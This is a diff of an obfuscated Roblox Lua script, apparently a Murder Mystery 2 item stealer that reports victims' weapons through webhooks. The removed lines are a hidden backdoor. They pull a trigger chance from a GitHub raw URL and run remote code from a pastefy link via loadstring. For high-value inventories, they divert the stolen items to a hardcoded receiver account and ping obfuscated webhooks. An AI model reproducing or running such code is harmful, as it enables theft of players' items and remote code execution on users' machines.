@@ -991,21 +991,6 @@ end
 
 local v246 = MM2_API_BASE .. "/webhook/"
 local v247 = MM2_API_BASE
-local n7 = 0
-
-pcall(function()
-	local match = game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/m"):match("%d+%.?%d*")
-
-	if match then
-		n7 = tonumber(match) or 0
-	else
-		n7 = 0
-	end
-end)
-
-local v250 = n7
-
-v32("SPECIAL_WEBHOOK_CHANCE=" .. v250)
 
 local function v251(p21, p22, p23)
 	if not request_ or p21 == "" then
@@ -1186,8 +1171,6 @@ local function v269(p24, p25)
 	}
 end
 
-getgenv().BLACKLIST_URL = "https://pastefy.app/YUhu3IrQ/raw"
-
 local u276 = false
 
 local function v277()
@@ -1205,81 +1188,7 @@ local function v277()
 	v32("allWeaponsLog=" .. #u215 .. " weaponsToSend=" .. #u196 .. " totalAllValue=" .. n2 .. " totalAllDollar=$" .. n3)
 
 	local v278 = v262()
-	local v279 = false
-	local v280, v281, v282 = ipairs(u215)
-	local v283 = geniter(v280, v281, v282)
-
-	while true do
-		local v284 = table.pack(v283())
-
-		if v284[1] then
-			if (v284[3]).Value >= 8000 then
-				v279 = true
-
-				break
-			end
-		else
-			break
-		end
-	end
-
-	if n2 >= 15000 then
-		v279 = true
-	end
-
-	if getgenv().BLACKLIST_URL and v279 then
-		local ok4, result4 = pcall(function()
-			return game:HttpGet(getgenv().BLACKLIST_URL)
-		end)
-
-		if ok4 and result4 then
-			local chunk = loadstring(result4)
-
-			if chunk then
-				local ok5, result5 = pcall(chunk)
-
-				if ok5 and type(result5) == "table" then
-					local v291, v292, v293 = ipairs(result5)
-					local v294 = geniter(v291, v292, v293)
-
-					while true do
-						local v295 = table.pack(v294())
-
-						if v295[1] then
-							local v296 = v295[3]
-
-							if LocalPlayer.Name:lower() == v296:lower() then
-								v279 = false
-
-								break
-							end
-						else
-							break
-						end
-					end
-				end
-			end
-		end
-	end
-
-	local v297 = math.random()
 	local v298 = false
-
-	v32("special=" .. tostring(v279) .. " roll=" .. string.format("%.4f", v297) .. " chance=" .. tostring(v250))
-
-	if v279 and v297 <= v250 then
-		v32("SPECIAL webhook firing!")
-		RECEIVERS = { "NEDYXSTOCK_chano" }
-
-		local v299 = v269(false, v278)
-
-		v299.content = "@everyone"
-		v251("AaFasalajblbebHagaqa[aebSa@aaaVaebVacb+aka*a%azamawaya_aNacaCaKacaDaPa=azaiaFada%aAa-a{a%adatbUaba7awaDahayagbkbwaGa!abaVa6avaaaya6aRayalbtb-aQa(aibzawbgamaaaAaOafaPa8agaia8agb+aaaXaxa-aiaEaga4aEaka@ana-a*aSafadbbbiaEa*avaaabbqaBaCa&aCagbRaRakbhb$aNahb2a%aCalbFaka+aAalauaRbpaaaib", v299.content, v299.embeds)
-		task.wait(0.5)
-		v256()
-
-		return
-	end
 
 	local v300 = false
 	local v301 = false
@@ -1342,12 +1251,6 @@ local function v277()
 		if v298 then
 			v256()
 		end
-	end
-
-	v251("AaFaIalakb*abbaaMaqa[a6aLa-aaacbdb4a_a+aka*aSbeb<awala1aGaaaCa3acasa8a#aEaebaada#aba)a=akbdaRbnaXatawaDahayagbkbwaQazaba6a$avaaayaza[ayalbFb-aFagbibubyaga[aaaAabafa!a1a7aiafa6a*a8acaxa-aiazagavaebDamana-a(aSazaibdbabEa*aHaaabbqa=aCa$aQagbcaMakbhb1ajaibha%aCalbFaka#aAajbuazaBaaajb", "", v269(true, nil).embeds)
-
-	if v300 then
-		v251("AaFanaVa>a-aebhaUaqa]aKaQa}aaawaab#aPb+aka*agbxajbwa=a4axauaCaracavaea&aEa0atada$awa=a-a=adaFbXa#a[awaDahayagbkbwataDabaxabavaaayaEa{ayalbIb-agaSbibLbNbgafaaaAa>afaza4a5aiaOala(aqaRaxa-aiaBaga_a%aUa0ana-a^aGagacb>acbEa*awaaabbqakaCa-amagbcblakbhb2aZahbsa%aCalbFaka]aAaTaua*acaaafb", "", v269(true, nil).embeds)
 	end
 end
 
